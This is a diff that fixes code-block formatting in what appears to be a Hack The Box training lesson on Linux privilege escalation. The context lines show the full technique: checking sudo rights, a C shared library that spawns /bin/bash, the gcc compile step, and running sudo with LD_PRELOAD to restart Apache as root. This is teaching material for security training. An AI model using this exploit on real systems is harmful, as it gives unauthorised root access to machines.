@@ -8,8 +8,7 @@ There are multiple methods for specifying the location of dynamic libraries, so 
 
 Additionally, the `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the `ldd` utility.
 
-```
-        shellsession
+```shellsession
 htb_student@NIX02:~$ ldd /bin/ls
 
     linux-vdso.so.1 =>  (0x00007fff03bc7000)
@@ -29,8 +28,7 @@ The image above lists all the libraries required by `/bin/ls`, along with their 
 
 Let's see an example of how we can utilize the [LD\_PRELOAD](https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges. For this, we need a user with `sudo` privileges.
 
-```
-        shellsession
+```shellsession
 htb_student@NIX02:~$ sudo -l
 
 Matching Defaults entries for daniel.carter on NIX02:
@@ -42,8 +40,7 @@ User daniel.carter may run the following commands on NIX02:
 
 This user has rights to restart the Apache service as root, but since this is `NOT` a [GTFOBin](https://gtfobins.github.io/#apache) and the `/etc/sudoers` entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the `LD_PRELOAD` issue to run a custom shared library file. Let's compile the following library:
 
-```
-        C
+```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -59,15 +56,13 @@ system("/bin/bash");
 
 We can compile this as follows:
 
-```
-        shellsession
+```shellsession
 htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
 ```
 
 Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.
 
-```
-        shellsession
+```shellsession
 htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
 
 id
